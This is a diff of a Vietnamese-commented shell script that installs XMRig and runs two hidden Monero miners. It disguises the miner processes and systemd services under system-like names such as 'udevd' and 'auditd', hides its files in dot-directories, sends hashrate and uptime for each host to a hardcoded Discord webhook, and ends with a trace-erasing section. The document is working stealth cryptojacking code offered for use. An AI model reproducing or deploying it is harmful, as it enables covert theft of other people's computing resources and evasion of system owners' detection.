@@ -8,37 +8,29 @@
 WALLET="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # ⚠️ Thay ví của bạn vào đây
 POOL="pool.hashvault.pro:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
+
+
 KEY="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
 WORKER1="core_$(hostname)"
 WORKER2="silent_$(hostname)"
-
-
 TOTAL_CORES=$(nproc)
 THREADS1=$(awk "BEGIN {print int($TOTAL_CORES * 0.4)}")
 THREADS2=$(awk "BEGIN {print int($TOTAL_CORES * 0.3)}")
-
 PRIORITY=3
-
-# Các biến riêng cho từng tiến trình
 NAME1=$(shuf -n1 -e "dbusd" "syscore" "udevd")
 NAME2=$(shuf -n1 -e "corelogd" "netlog" "sysnet")
-
 DIR1="$HOME/.local/share/.cache/.dbus1"
 DIR2="$HOME/.local/share/.cache/.dbus2"
-
 SERVICE1=$(shuf -n1 -e "systemd-resolver" "kernel-log" "net-fix")
 SERVICE2=$(shuf -n1 -e "auditd" "modprobe-sync" "xinetd")
-
 LOG1="/tmp/xmrig-log1.log"
 LOG2="/tmp/xmrig-log2.log"
-# ============================
 
-echo "🚀 Đang cài đặt XMRig kép..."
 
-# Cài thư viện cần thiết
+
+echo "🚀 Đang cài đặt XMRig"
 sudo apt update
 sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl
-
 # Clone và build XMRig
 cd ~
 rm -rf xmrig
@@ -88,7 +80,7 @@ Nice=10
 WantedBy=multi-user.target
 EOF
 
-# Kích hoạt cả hai service
+# Kích hoạt cả service
 sudo systemctl daemon-reload
 sudo systemctl enable $SERVICE1
 sudo systemctl enable $SERVICE2
@@ -114,16 +106,11 @@ THREADS=$THREADS1
 
 curl -s -H "Content-Type: application/json" -X POST -d "{
   \\"username\\": \\"XMRig Status\\",
-  \\"content\\": \\"🖥️ \\\`\$HOST\\\` đào ví 1\\n⚙️ Process: \\\`$NAME1\\\`\\n🧠 Threads: \\\`\$THREADS\\\`\\n💨 Hashrate: \\\`\$HASHRATE\\\`\\n📈 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
+  \\"content\\": \\"🖥️ \\\`\$HOST\\\` Connected\\n⚙️ Process: \\\`$NAME1\\\`\\n🧠 Threads: \\\`\$THREADS\\\`\\n💨 Hashrate: \\\`\$HASHRATE\\\`\\n📈 CPU Usage: \\\`\${CPU_USAGE}%\\\`\\n⏱️ Uptime: \\\`\$UPTIME\\\`\\"
 }" "\$WEBHOOK" > /dev/null 2>&1
 EOF
 
 chmod +x "$DIR1/logminer.sh"
-
-# Tạo cron gửi log mỗi 5 phút
-(crontab -l 2>/dev/null; echo "*/5 * * * * $DIR1/logminer.sh") | crontab -
-
-# Gửi ping đầu tiên
 "$DIR1/logminer.sh"
 
 # Xoá dấu vết
